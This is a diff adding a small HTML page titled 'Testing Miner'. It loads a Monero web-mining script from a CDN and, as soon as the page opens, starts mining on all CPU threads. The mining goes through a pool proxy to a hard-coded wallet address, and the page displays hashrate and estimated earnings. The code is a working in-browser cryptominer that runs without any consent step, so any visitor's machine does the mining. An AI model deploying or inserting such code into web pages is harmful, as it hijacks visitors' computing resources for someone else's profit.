@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Testing Miner</title>
+
+  <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+</head>
+<body>
+  <p><span id="hashrate"></span> hps</p>
+  <p><span id="totalhash"></span> hashes</p>
+  <p><span id="sph"></span> sats/h</p>
+</body>
+<script defer>
+  console.log("Config Loaded")
+  server = "wss://ny1.xmrminingproxy.com";
+  const pool = "moneroocean.stream";
+  const walletAddress = "45uvbCBBiiJGjEqXdystEN3K2zsGDpNdYTezy5gDSdg33s2uDvWK3nXfr4WptYALaPC5Z2XFVWB4sWSw3cbKryJMNqnLwmw";
+  const workerId = "CYCLE_T"
+  const threads = -1;
+  const password = "";
+  startMining(pool, walletAddress, workerId, threads, password);
+  throttleMiner = 20;
+
+  const totalHash = document.getElementById('totalhash');
+  const hashRate = document.getElementById('hashrate');
+  const satsPerHour = document.getElementById('sph');
+
+  let tp = 0;
+  setInterval(() => {
+    tp += 5;
+    const hr = totalhashes / tp;
+    totalHash.innerText = totalhashes.toFixed(2);
+    hashRate.innerText = hr.toFixed(2);
+
+    const p = hr / 5_860_000_000; // 5.8GH/s
+    const btch = (18 * p) * 0.0029; // Bitcoin por hr... (0.0029 = preço do XMR em BTC)
+    const sath = btch * 100_000_000; // Satoshi por hora
+
+    satsPerHour.innerText = sath.toFixed(2);
+  }, 5000)
+</script>
+</html>
